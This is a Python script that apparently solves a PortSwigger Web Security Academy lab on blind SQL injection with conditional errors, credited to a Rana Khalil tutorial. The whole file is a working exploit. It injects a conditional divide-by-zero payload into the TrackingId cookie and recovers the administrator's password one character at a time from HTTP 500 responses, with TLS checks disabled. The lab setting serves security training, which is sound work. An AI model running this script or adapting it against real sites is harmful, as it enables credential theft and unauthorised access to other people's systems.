# PortSwigger's Web Security Academy Lab 12 - Blind SQL injection with conditional errors
# Original code provided by Rana Khalil - https://www.youtube.com/watch?v=o__q8CzK2ts&list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf

import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'} #old URLLIB3 syntax?

proxies = {'https': 'http://127.0.0.1:8080'} #New syntax for URLLIB3

def sqli_password(url,trackingId,sessionId):
    password_extracted = ""
    for i in range (1,21):
        for j in range (32,126): # Will convert the dec value to ascii rather than needing to create an array of values and looping
            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j) #MUST CONVERT TO ASCII
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookie = {'TrackingId': trackingId + sqli_payload_encoded, 'session': sessionId} #copy in cookie value and session value
            r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) != 4:
        print("[+] Usage: %s <url> <TrackingId> <SessionId>" % sys.argv[0])
        print("[+] Example: %s \"www.example.com\" \"EKxYesbVHdCVRm2J\" \"BYpIVM1tCjE5ITYHNijuyY62svZkTaWW\"" % sys.argv[0])
        exit()
    url = sys.argv[1]
    trackingId = sys.argv[2]
    sessionId = sys.argv[3]
    print("[+] Retrieving administrator password...")
    sqli_password(url,trackingId,sessionId)
    sys.stdout.write('\n') # add newline at the end to allow for easier cut/paste

if __name__ == "__main__":
    main()